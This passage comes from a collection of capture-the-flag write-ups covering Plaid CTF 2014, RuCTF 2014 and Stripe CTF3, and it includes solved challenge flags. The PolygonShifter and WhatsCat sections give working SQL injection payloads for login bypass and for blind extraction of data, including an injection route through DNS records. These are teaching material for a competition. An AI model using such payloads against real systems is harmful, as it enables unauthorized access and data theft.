<div class="row">
<div class="medium-10 small-centered columns">
    <h3>To demonstrate our technology, we have a form that is protected with our solution. Humans shall pass, but bots will FAIL.</h3>
    <h3>Test account is test / test</h3>
    <!--<h3>For admin interface, admin / ???????</h3>-->
</div>
</div>
```

Let’s try to log in to this admin account. We don’t have the credentials, so we’ll try SQL injection instead:

* Username: `admin' OR 'a'='a`
* Password: `random`

Great, we’re logged in! We are welcomed with the following message:

> Hello, admin!! My password is the flag!

It seems like we need to find the password using SQL injection. Let’s peek into the source code some more:

```html
<h4 class="product-header">A friendly login form; not so friendly for bots!</h4>
<div class="medium-11 small-centered columns">
    <form action="/P0zxeNVpdjH6myRHaWVS" method="POST">
        <label for="" style="text-align:left;">Username</label>
        <input type="text" id="6lyNestBnznos6FxGtGD" name="dVURHUzXGy69u5thdZY0">
        <label for="bFixmywlQhbkX1uC1oI2" style="text-align:left;">Password</label>
        <input type="password" id="bFixmywlQhbkX1uC1oI2" name="SU8IPPqzwozVlQzuaWSA">
        <input class="primary large" type="submit" value="Login">
    </form>
</div>
```

Okay, we cannot use the `id`s or `name`s of these fields to automate the process since they change for every request. No problem — we don’t really need those anyway. The source code doesn’t seem to have any more input fields, so we can just input our username in whatever’s the first input field on the page, and the password into the second field.

```js
var arr = document.getElementsByTagName('input');
arr[0].value = 'admin';
arr[1].value = "' or (password LIKE '%a%') and 1='1";
```

If we manage to successfully log in as admin using these values, we know that our query succeeded and that there’s an `a` in the password. Using a similar technique, we can slowly figure out the password character by character (cfr. [the WhatsCat challenge write-up](https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/whatscat)).

We wrote a [PhantomJS](http://phantomjs.org/) script for this named [`client.js`](client.js). Run it as follows:

```bash
$ phantomjs client.js "(password like 'a%')"
```

After some testing, we find that the flag is `n0b0t5_C4n_bYpa5s_p0lYm0rph1Sm`.

## Other write-ups

* <http://balidani.blogspot.com/2014/04/plaidctf-2014-polygonshifter-writeup.html>
* <https://ucs.fbi.h-da.de/writeup-plaidctf-2014-polygonshifter/>
* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-100-blind-sql-injection>
* <http://eindbazen.net/2014/04/plaidctf-2014-polygonshifter-100/>

# Plaid CTF 2014

* [Main website](http://play.plaidctf.com/)
* [Scoreboard](http://play.plaidctf.com/scoreboard)
* [@PlaidCTF on Twitter](https://twitter.com/PlaidCTF)
* [Plaid CTF 2014 @ CTFTime.org](https://ctftime.org/event/119)
* [Source code for some of the challenges](https://github.com/pwning/plaidctf2014) (released after the CTF; not needed to solve the challenges)

## Completed write-ups

* [curlcore](curlcore)
* [doge_stege](doge-stege)
* [g++](g)
* [halphow2js](halphow2js)
* [Heartbleed](heartbleed)
* [kpop](kpop)
* [mtpox](mtpox)
* [Multiplication is hard](multiplication-is-hard)
* [paris](paris)
* [PolygonShifter](polygonshifter)
* [rsa](rsa)
* [Sanity check](sanity-check)
* [twenty](twenty)
* [WhatsCat](whatscat)

## Incomplete write-ups

* [bbos](bbos)
* [bronies](bronies)
* [ezhp](ezhp)
* [freya](freya)
* [gcc](gcc)
* [graphs](graphs)
* [harry-potter](harry-potter)
* [hudak](hudak)
* [jackshit](jackshit)
* [kappa](kappa)
* [moscow](moscow)
* [nightmares](nightmares)
* [parlor](parlor)
* [reeekeeeeee](reeekeeeeee)
* [rendezvous](rendezvous)
* [sass](sass)
* [tenement](tenement)
* [tiffany](tiffany)
* [wheeeee](wheeeee)
* [zfs](zfs)

# Plaid CTF 2014: reeekeeeeee

**Category:** Web
**Points:** 200
**Description:**

> The Plague seems obsessed with internet memes, though we don't yet know why. Perhaps there is a clue to what he's up to on [this server](http://54.82.251.203:8000/) (epilepsy warning). If only you could break in.... [Here](reekee-d45a5cec85c467ed9a21934b871a88d1.tar.bz2) is some of the source.

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.se/2014/04/plaidctf-2014-reeekeeeeee-writeup/>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/reekee)

# Plaid CTF 2014: rendezvous

**Category:** Misc
**Points:** 250
**Description:**

> The Plague has a friend called Alice who has some secrets on [a Tor service](http://6c4dm56aer6xn2h2.onion/). We think if we can talk to her, we can learn some useful things about The Plague. Unfortunately she will only rendezvous with "chandler" when he brings a cookie with "beef" baked into it. Can you help us find her secret?

## Write-up

(TODO)

The flag is `flag{why_you_so_damn_creepy}`.

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-misc250-rendezvous.html>
* [Tor patch for this challenge](https://gist.github.com/anonymous/21998734ea157023dbae) by @foundation

# Plaid CTF 2014: rsa

**Category:** Forensics
**Points:** 450
**Description:**

> Our archaeologists recovered a dusty and corrupted old hard drive used by The Plague in his trips into the past. It contains a private key, but this has long since been lost to bitrot. Can you recover the full key from the [little information we have recovered](rsa-6537e9aae493b0c43601d1dbc2da2ce2.tar.bz2)?

## Write-up

_This write-up is made by Steven of the [HacknamStyle](http://hacknamstyle.net/) CTF team._

After some Googling, a tool can be found to recover corrupted RSA private keys, linked to the paper [_Reconstructing RSA Private Keys from Random Key Bits_ by Nadia Heninger and Hovav Shacham](http://cseweb.ucsd.edu/~hovav/papers/hs09.html).

The `rsabits` tool takes a corrupted private and public key as input, and then recovers the missing bits. To distinguish actual vs. missing bits, `rsabits` uses a ‘mask’ where an ‘on’ bit means ‘known’ and an ‘off’ bit means ‘unknown’. Since this is an academic prototype, the code needs [some patching to actually output the recovered private key](rsabits.patch).

The input file for `rsabits` consists of two parts: the public key information and the private key information.

The modulus and exponent of the public key can be extracted using the following command:

```bash
$ cat public.pub | grep -v -- ----- | tr -d '\n' | base64 -d | openssl asn1parse -inform DER -i -strparse 18
0:d=0  hl=3 l= 137 cons: SEQUENCE
3:d=1  hl=3 l= 129 prim:  INTEGER           :DBFABDB1495D3276E7626B84796E9FC20FA13C1744F10C8C3F3E3C2C6040C2E7F313DFA3D1FE10D1AE577CFEAB7452AA53102EEF7BE0099C022560E57A5C30D50940642D1B097DD2109AE02F2DCFF8198CD5A395FCAC4266107848B9DD63C387D2538E50415343042033EA09C084155E652B0F062340D5D4717A402A9D806A6B
135:d=1  hl=2 l=   3 prim:  INTEGER           :010001
```

The bits of the private key can be extracted from the corrupted file after some text-fiddling and converting the hex values to
decimal using `ibase 16` in `bc`.

The final `rsabits` input file can be found in [`input-numbers.txt`](input-numbers.txt), which is fed to the `rsabits` tool:

```bash
$ ./rsa -i input-numbers.txt
```

The tool will print out values for `P` and `Q`:

```
12643740637395110652894262209502063899047520218436247735878188180335985789877601396069401620713231058940443043891453952791936466967524033214476598572706213
12217494205780318874865198006759446969679921137474855298485716817925925911890415286181103665676748660959871257808447814451048738105000263500773868071134927
```

…which can then be converted into a private key using [`rsatool.py`](https://github.com/ius/rsatool/blob/master/rsatool.py):

```bash
$ ./rsatool.py -p 12643740637395110652894262209502063899047520218436247735878188180335985789877601396069401620713231058940443043891453952791936466967524033214476598572706213 -q 12217494205780318874865198006759446969679921137474855298485716817925925911890415286181103665676748660959871257808447814451048738105000263500773868071134927 -o recovered.key
```

[The resulting key](recovered.key) can then be used to decrypt the given ciphertext:

```bash
$ openssl rsautl -decrypt -in ciphertext -out plaintext -inkey recovered.key
```

…which reveals the flag `crypt0>>>f0rensics3~`.

## Other write-ups and resources

* [Write-up by More Smoked Leet Chicken](http://mslc.ctf.su/wp/plaidctf-2014-rsa-writeup/)
* [Write-up by fail0verflow](https://fail0verflow.com/blog/2014/plaidctf2014-for450-rsa.html)
* [Reconstructing RSA private keys from random key bits](http://cseweb.ucsd.edu/~hovav/papers/hs09.html)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/forensics/rsa)

# Plaid CTF 2014: Sanity check

**Category:** Misc
**Points:** 1
**Description:**

> The key is poop

## Write-up

They aren’t kidding. The flag is literally `poop`.

## Other write-ups

* none yet

# Plaid CTF 2014: sass

**Category:** Pwnables
**Points:** 200
**Description:**

> Not all of The Plagues services seem secure. Getting into [this one](sass-3b23e61c9defaf34f7111ba425f12208.gz), might give us some clues as to when he is planning to time jump to next. The service is at 54.198.50.139:5455; you may also want to `ssh` to `ctf@54.198.50.139` (password: `ctf`) to debug your exploits in the local environment. Read the `README_SASS` there!

## Write-up

(TODO)

## Other write-ups and resources

* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/sass)

# Plaid CTF 2014: tenement

**Category:** Pwnables
**Points:** 100
**Description:**

> The Plague has tried to make things easy for you in [this service](tenement-38db26ad2799801263a066a831526836.tar.bz2), but not too easy. He's called The Plague, not The Nice Guy. The service should be running at 54.235.7.236:9999.

## Write-up

(TODO)

The flag is `Wub-a-lubba-dub-dub`.

## Other write-ups

* <https://cesena.ing2.unibo.it/2014/04/15/plaidctf-2014-tene-pwn-100/>
* <http://nullify-ctf.blogspot.com/2014/04/pwnables-100-tenement-plaidctf-2014.html>

# Plaid CTF 2014: tiffany

**Category:** Reversing
**Points:** 300
**Description:**

> We want to get access to a server used by The Plague. Maybe if you can find out what key is accepted by [this binary](tiffany-0233a625fc40b2dda9c31781a0dbb46e.tar.bz2) you can find out where or when The Plague is...
>
> Hint: each instance does a very simple thing.

## Write-up

(TODO)

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-re300-tiffany.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/reversing/tiffany)

# Plaid CTF 2014: twenty

**Category:** Crypto
**Points:** 20
**Description:**

> It’s so far in the past, computers haven’t even been imagined, let alone used. But somehow The Plague has already been here, building an evil army of hackers. Can you find his [secret message](twenty-c870a2814484278ecd90c21f35cd45ae.tar.bz2)?

## Write-up

After extracting the tarball we end up with a file named `twenty.txt` with the following contents:

```
fvoxoxfvwdepagxmwxfpukleofxhwevefuygzepfvexwfvufgeyfryedojhwffoyhxcwgmlxeylawfxfurwfvoxecfezfvwbecpfpeejuygoyfefvwxfpwwfxojumwuxfuffvwawuxflecaazubwjwoyfvwyepfvwuxfhwfjlopwckaohvfjlzopwoaahevupgwpfvuywjoywjdwyfufjupouvbuaajwuaoupkecygjwoyfvwuxxdofvyeacmwbvuzoyhlecpwzcbroyhdofvfvwgcgwdveheffvwrwlxfelecpxuzwuygfvexwfvufbuyfgempoyhxcofxbplfelecpcybawxujfexwffawgoxkcfwxfvechvflecgfubrawfvoxdofvuaoffawjepwfubfmcffvwyuhuoyzcghwkubrwpxogeyfryediubroxvwgufwupwswplfojwofvoyrezaorxuyhmcfxvofjuyfvwlpwubepkepufoeyuygojukwpxeyozobufoeyezzpwwgejzepuaaleczoaagebrwfxaorwfvufxubeybwkfzepwohyfeluaadvoawaudlwpxjcggldufwpuygfpexxfuaaecfezmcxoywxxoxiuoazepjwuyglecpwxcoyhjwbosoaalwnvomoffvoxoyfvwbecpfpeejheeygeofogupwlecbeyhpufcaufoeyxfvwzauhoxxoybwywdbplkfejohvfvuswyxumubrgeepxocxweagbplkfe
```

The string is encoded using a Vigenère cipher: each letter of the alphabet represents a number from 0 to 25. The key is added to the original message to form the decoded message. Since the message is usually longer than the key it is necessary to duplicate the key until it reaches the length of the original message. To decode the message, the key is subtracted from the decoded message to obtain the original message.

[`cipher_solver.py`](cipher_solver.py) uses an implementation of the hill climbing algorithm to calculate the key. It is assumed that the key is a permutation of all the letters of the alphabet. The algorithm starts with the key `ABC…Z` and calculates the decoded message. The `ngram_score` module is used to calculate the score of this decoded string. `ngram_score` uses `quadgrams.txt` which is a file that lists all combinations of 4 characters and their occurence frequency in the English language.

By searching the decoded string for these n-grams it is possible to calculate a score for the decoded string. If this decoded strings score is higher (resembled the English language better) than the previous score, this key is presumed to be closer to the final key and it will be used in the next iteration of the hill climbing algorithm.

For each iteration, two characters are swapped and the previously explained process is repeated until the user stops the program or the score of the decoded string exceeds `maxscore`.

This delivered the correct decoded string which contained the flag.

The flag is `sincenewcryptomighthavensabackdoorsiuseoldcrypto`.

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-plaidctf-2014-twenty/>
* <https://docs.google.com/a/google.com/document/d/1WthFuKx3sAtqTVPOklVJt12MMS3lrxITGglskPKNtL8/edit>
* <http://csrc.tamuc.edu/css/?p=169>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/crypto/twenty)

# Plaid CTF 2014: WhatsCat

**Category:** Web
**Points:** 300
**Description:**

> The Plague is using his tremendous talent for web applications to build social websites that will get bought out for billions of dollars. If you can stop his climb to power now by showing how insecure [this site really is](http://54.196.116.77/), (on IPv6 at 2001:470:8:f7d::1) maybe we will be able to stop his future reign of terror. [Here](whatscat-59b6f6c9b192457fa3e7d2253c8b24c9.tar.bz2)'s some of his source.

## Write-up

The source code in the tarball has a SQL injection vulnerability in the `login` file.

```php
$pwnew = "cat".bin2hex(openssl_random_pseudo_bytes(8));
if ($res) {
  echo sprintf("<p>Don't worry %s, we're emailing you a new password at %s</p>",
    $res->username,$res->email);
  echo sprintf("<p>If you are not %s, we'll tell them something fishy is going on!</p>",
    $res->username);
$message = <<<CAT
Hello. Either you or someone pretending to be you attempted to reset your password.
Anyway, we set your new password to $pwnew

If it wasn't you who changed your password, we have logged their IP information as follows:
CAT;
  $details = gethostbyaddr($_SERVER['REMOTE_ADDR']).
    print_r(dns_get_record(gethostbyaddr($_SERVER['REMOTE_ADDR'])),true);
  mail($res->email,"whatscat password reset",$message.$details,"From: whatscat@whatscat.cat\r\n");
  mysql_query(sprintf("update users set password='%s', resetinfo='%s' where username='%s'",
          $pwnew,$details,$res->username));
}
else {
  echo "Hmm we don't seem to have anyone signed up by that name";
}
```

There’s no way the generated value of `$pwnew` could ever contain `'`, so we can’t use that as part of the exploit. The same goes for the user’s IP address (`$_SERVER['REMOTE_ADDR']`).

However, `dns_get_record(gethostbyaddr($_SERVER['REMOTE_ADDR']))` is also used in the query without proper escaping. So we could get a server, change its [DNS PTR record](http://en.wikipedia.org/wiki/Reverse_DNS_lookup) so the server IP points to a domain name under our control, and configure a TXT record that contains a SQL injection payload on that domain. [Alexey Kaminsky has a write-up detailing this solution.](http://akaminsky.net/plaidctf-quals-2014-web-300-whatscat/) Alternatively, you could set up your own DNS server for this challenge, and have it automatically inject TXT records with the payload, [like @phiber did](https://gist.github.com/anonymous/ea292c8dc60a2d8fba50).

Another option is to hide the SQL injection payload in the username. The downside of this approach is that since the username is reflected in the `WHERE` clause of the query, only blind SQL injection is possible. Still, it’s possible to slowly leak data:

1. Register with username `foo`.
2. Register with username `foo' and 21=(select length(flag) from flag)#`.
3. Request a password reset for the second user.
4. Log in with the first username and its original password. If the password is rejected, then the condition in the payload (in this case `21 == length(flag)` is true, else it’s false.

After discovering the table and column name where the flag is hidden (they’re both `flag`), we can repeat this process to figure out what the flag is, one character at a time. For example, the username `foo' and (select ascii(substr(flag,1,1) from flag) between 97 and 122#` can be used to find out if the first character of the flag is a lowercase letter in the `[a-z]` range or not.

@ngocdh wrote [a neat solution in Python](https://gist.github.com/anonymous/f4e884a234ba5d3c9d37) that uses a clever implementation of this technique: it uses binary search to decrease the time needed to find the correct character.

The flag is `20billion_d0llar_1d3a`.

## Other write-ups and resources

* [Write-up by Alexey Kaminsky](http://akaminsky.net/plaidctf-quals-2014-web-300-whatscat/)
* [Write-up by Tasteless](http://tasteless.se/2014/04/plaidctf-2014-whatscat-writeup/)
* [Write-up by Ron Bowes](https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns)
* [Python solution that figures out the flag character by character, by @ngocdh](https://gist.github.com/anonymous/f4e884a234ba5d3c9d37)
* [Custom DNS server to perform SQL injection through rDNS records, by @phiber](https://gist.github.com/anonymous/ea292c8dc60a2d8fba50)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/whatscat)

# Plaid CTF 2014: wheeeee

**Category:** Crypto
**Points:** 375
**Description:**

> Although it seems like The Plague's messaging service is secure, there are bound to be bugs in any 20th century crypto system. We've recovered [a version](wheeeee-8aa05f8827f5ece6a27c021eae46d118.tar.bz2) of the block cipher The Plague implemented. Use their online encryptor tool, at 54.82.75.29:8193, to break the cipher and figure out Plague's secret plans.
>
> NOTE: When the service sends you a hex-encoded string, respond with a hex-encoded string.

## Write-up

(TODO)

## Other write-ups

* <http://mslc.ctf.su/wp/plaidctf-2014-wheeeee-writeup/>
* <https://fail0verflow.com/blog/2014/plaidctf2014-crypto375-wheeeee.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/crypto/wheeeeeeeeeeeeeeeeeeeeeee)

# Plaid CTF 2014: zfs

**Category:** Forensics
**Points:** 400
**Description:**

> The Plague is using state of the art systems for storing his data. Our operatives managed to steal [a drive](zfs-ff06f37193caa92456e9c03090c80600.tar.bz2) from one of his servers, but it seems like our haste may have led to some uber-corruption. Can you get the data off the drive to track down The Plague?

## Write-up

(TODO)

The flag is `ZFS_daTa_1s_s4f35t_d4t4`.

## Other write-ups

* <https://fail0verflow.com/blog/2014/plaidctf2014-for400-zfs.html>
* <https://ctftime.org/writeup/1083>

# CTF write-ups

There are some problems with CTF write-ups in general:

* they’re scattered across the interwebs
* they don’t usually include the original files needed to solve the challenge
* some of them are incomplete or skip ‘obvious’ parts of the explanation, and are therefore not as helpful for newcomers
* often they disappear when the owner forgets to renew their domain or shuts down their blog

This repository aims to solve those problems.

It’s a collection of CTF source files and write-ups that anyone can contribute to. Did you just publish a CTF write-up? [Let us know](https://github.com/ctfs/write-ups/issues/new), and we’ll add a link to your post — or just add the link yourself and submit a pull request. Spot an issue with a solution? Correct it, and send a pull request.

# RuCTF 2014 Quals: Admin 100

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Admin 200

(TODO)

## Other write-ups

* <http://tasteless.se/2014/03/ructf-quals-2014-for200-and-admin200-writeup/>

# RuCTF 2014 Quals: Admin 300

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Admin 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Crypto 100

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Crypto 200

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Crypto 300

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Crypto 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Crypto 500

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Forensics 100

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Forensics 200

(TODO)

## Other write-ups

* <http://tasteless.se/2014/03/ructf-quals-2014-for200-and-admin200-writeup/>

# RuCTF 2014 Quals: Forensics 300

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Forensics 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Hardware 100

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Hardware 200

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Hardware 300

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Hardware 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Misc 100

The easiest way to approach this is to go old-school and do it by hand. After a bit of tedious work, it should look something like this:

![](shredder.jpg)

The flag is `RUCTF_TO_SHRED_IS_NOT_ENOUGH`.

## Other write-ups

* none yet

# RuCTF 2014 Quals: Misc 200

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Misc 300

(TODO)

## Other write-ups

* <http://translate.google.com/translate?sl=ko&tl=en&u=http://blackcon.tistory.com/97>

# RuCTF 2014 Quals: Misc 500

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: PPC 200

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: PPC 300

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: PPC 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals write-ups

[RuCTF Quals](http://quals.ructf.org/)

## Completed write-ups

* [Misc 100](misc-100)

## Incomplete write-ups

* [Admin 100](admin-100)
* [Admin 200](admin-200)
* [Admin 300](admin-300)
* [Admin 400](admin-400)
* [Crypto 100](crypto-100)
* [Crypto 200](crypto-200)
* [Crypto 300](crypto-300)
* [Crypto 400](crypto-400)
* [Crypto 500](crypto-500)
* [Forensics 100](forensics-100)
* [Forensics 200](forensics-200)
* [Forensics 300](forensics-300)
* [Forensics 400](forensics-400)
* [Hardware 100](hardware-100)
* [Hardware 200](hardware-200)
* [Hardware 300](hardware-300)
* [Hardware 400](hardware-400)
* [Misc 200](misc-200)
* [Misc 300](misc-300)
* [Misc 500](misc-500)
* [PPC 200](ppc-200)
* [PPC 300](ppc-300)
* [PPC 400](ppc-400)
* [Recon 100](recon-100)
* [Recon 200](recon-200)
* [Recon 300](recon-300)
* [Recon 400](recon-400)
* [Recon 500](recon-500)
* [Reverse 10](reverse-10)
* [Reverse 100](reverse-100)
* [Reverse 200](reverse-200)
* [Reverse 300](reverse-300)
* [Reverse 400](reverse-400)
* [Reverse 500](reverse-500)
* [Stegano 100](stegano-100)
* [Stegano 200](stegano-200)
* [Stegano 300](stegano-300)
* [Stegano 400](stegano-400)
* [Stegano 500](stegano-500)
* [Vuln 100](vuln-100)
* [Vuln 200](vuln-200)
* [Vuln 300](vuln-300)
* [Vuln 400](vuln-400)
* [Vuln 500](vuln-500)
* [Web 100](web-100)
* [Web 200](web-200)
* [Web 300](web-300)
* [Web 400](web-400)
* [Web 500](web-500)

# RuCTF 2014 Quals: Recon 100

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Recon 200

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Recon 300

(TODO)

## Other write-ups

* <http://tasteless.se/2014/03/ructf-quals-2014-vuln100-and-recon300-writeup/>

# RuCTF 2014 Quals: Recon 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Recon 500

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Reverse 10

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Reverse 100

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Reverse 200

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Reverse 300

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Reverse 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Reverse 500

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Stegano 100

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Stegano 200

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Stegano 300

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Stegano 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Stegano 500

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Vuln 100

(TODO)

## Other write-ups

* <http://tasteless.se/2014/03/ructf-quals-2014-vuln100-and-recon300-writeup/>

# RuCTF 2014 Quals: Vuln 200

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Vuln 300

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Vuln 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Vuln 500

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Web 100

(TODO)

## Other write-ups

* <http://tasteless.se/2014/03/ructf-quals-2014-web100-and-web200-writeup/>

# RuCTF 2014 Quals: Web 200

(TODO)

## Other write-ups

* <http://tasteless.se/2014/03/ructf-quals-2014-web100-and-web200-writeup/>

# RuCTF 2014 Quals: Web 300

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Web 400

(TODO)

## Other write-ups

* none yet

# RuCTF 2014 Quals: Web 500

(TODO)

## Other write-ups

* none yet

# Level 0

## Usage

To submit your code, first commit, and then run `git push`.

Only the program input will vary; we'll always run against the same
dictionary (`test/harness` will download that dictionary for you if
you don't have it).

See https://stripe-ctf.com for context on this level.

## Observations

It's hard to know what this script does, but it seems to take time
depending on the size of the input:

    $ time ./level0 < short.txt >/dev/null

    real  0m1.231s
    user  0m1.132s
    sys   0m0.096s

Compare to:

    $ time ./level0 < long.txt >/dev/null

    real  0m14.060s
    user  0m12.952s
    sys   0m1.104s

`wc -c` shows that long.txt is about 10 times larger than short.txt,
so it seems like the runtime grows linearly with input size. Since it
also has to read the entire input, there's not going to be a way to do
better than a linear-time solution.

## Catalog

- `build.sh`: We'll run this file before trying to run your code. This
  is likely only relevant if you rewrite in another language, but it
  also could be useful for something like fetching dependencies via
  Bundler. Feel free to modify it arbitarily; we'll run the modified
  version on our build servers. (https://stripe-ctf.com/about#build
  has more information on the build process.)

- `level0`: The mysterious program. Why so slow?

- `long.txt`: An example long input file.

- `short.txt`: An example short input file.

- `README.md`: This file :).

- `test/*`: A framework to make it easy for you to run test cases
  locally. You should only ever have to run `test/harness`.

# Stripe CTF3: level0

## Challenge

Your challenge is to make [this code](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level0/problem/level0) run much faster, without altering its output. In particular, you need to get it running at least as fast as our reference solution — when you submit a revision, we’ll tell you how our solution compares.

## Write-up

[The provided `level0` file](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level0/problem/level0) is a Ruby script that accepts text as input, and then returns that text with any words that are not in the dictionary wrapped in angle brackets.

```ruby
#!/usr/bin/env ruby

# Our test cases will always use the same dictionary file (with SHA1
# 6b898d7c48630be05b72b3ae07c5be6617f90d8e). Running `test/harness`
# will automatically download this dictionary for you if you don't
# have it already.

path = ARGV.length > 0 ? ARGV[0] : '/usr/share/dict/words'
entries = File.read(path).split("\n")

contents = $stdin.read
output = contents.gsub(/[^ \n]+/) do |word|
  if entries.include?(word.downcase)
    word
  else
    "<#{word}>"
  end
end
print output
```

Running [the provided test harness](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level0/problem/test/harness) yields the following output:

```bash
$ ./test/harness
No test case supplied. Randomly choosing among defaults.
Fetching. URL: https://stripe-ctf-3.s3.amazonaws.com/level0/level0-znKqYRKUDB.json
About to run test case: level0-znKqYRKUDB
Beginning run.
Finished run
Test case passed. Your time: 5.291982 seconds. Benchmark time: 0.672016 seconds. You/Benchmark: 7.874785
```

The goal of the level was to make this code more efficient, so that it’s faster than the benchmark.

The improvement that first comes to mind is to use a set or a hash table instead of an array to store the dictionary entries. That way, any lookups can be performed in `O(1)` (constant time).

```diff
diff --git a/level0 b/level0
index f320a7d..1333337 100755
--- a/level0
+++ b/level0
@@ -7,10 +7,11 @@

 path = ARGV.length > 0 ? ARGV[0] : '/usr/share/dict/words'
 entries = File.read(path).split("\n")
+table = Hash[entries.zip(Array.new(entries.size, true))]

 contents = $stdin.read
 output = contents.gsub(/[^ \n]+/) do |word|
-  if entries.include?(word.downcase)
+  if table[word.downcase]
     word
   else
     "<#{word}>"
```

[This solution](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level0/level0) is already faster than the reference solution:

```bash
$ ./test/harness
No test case supplied. Randomly choosing among defaults.
About to run test case: level0-znKqYRKUDB
Beginning run.
Finished run
Test case passed. Your time: 0.254984 seconds. Benchmark time: 0.672016 seconds. You/Benchmark: 0.379432
```

Level solved!

For more points, you could implement a [trie](http://en.wikipedia.org/wiki/Trie) data structure such as a [MARISA trie](https://code.google.com/p/marisa-trie/) to store the dictionary entries.

## Other write-ups or solutions

* <http://abiusx.com/stripe-ctf-v3-writeup/>
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* [@paraboul’s 3rd place solution](https://gist.github.com/paraboul/8735537)
* <https://github.com/henrik-muehe/level0>
* <https://github.com/metcalf/ctf3/tree/master/level0>
* <https://github.com/xthexder/stripe-ctf-3.0>
* <https://github.com/vinzenz/stripe-ctf3-solutions/tree/master/level0>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level0>
* <https://github.com/lericson/stripe-ctf3/tree/level0>
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)

# Gitcoin

Welcome to the wonderful world of Gitcoin!

## Overview

The balances are all contained in `LEDGER.txt`. We also have provided
you with a sample Gitcoin mining script in `miner` -- you'll probably
notice it's too slow to use in practice though. Note that for this
level you won't submit any code to us, as you'll be running everything
locally (you're welcome to email us solutions if you think they are
particularly cool, though).

The only commits that can be pushed are ones that:

- Increments an existing ledger entry by 1, or adds a new ledger entry
  with balance: 1; and
- Has a SHA1 lexicographically less than the value in `difficulty.txt`.

Add yourself to `LEDGER.txt` to pass the level (worth 50 points), at
which points the bots will stop.

Once you're done, check your account page to advance to the global
Gitcoin instance, where you can earn unbounded numbers of leaderboard
points.

Note that until you pass the level we'll periodically start a new
Gitcoin instance, at which point you'll have to run `git reset --hard
origin/master` to reset your clone's state.

## Catalog

- `difficulty.txt`: A strict upper bound on valid Gitcoin SHA1 values.

- `miner`: A sample Gitcoin mining script.

- `LEDGER.txt`: The current Gitcoin balances.

- `README.md`: This file.

# Stripe CTF3: level1

## Description

Cryptocurrencies are all the rage these days. Thus, today we’re proud to announce the release of a new one, entitled Gitcoin.

It’s easy to start a new Gitcoin instance: you start with a Git repository containing a `LEDGER.txt` file, which represents the starting balances (denoted in the form `username: <balance>`). You then transact by committing balance updates to the repository. A valid ledger might look like this:

```
Private Gitcoin ledger
==============
siddarth: 52
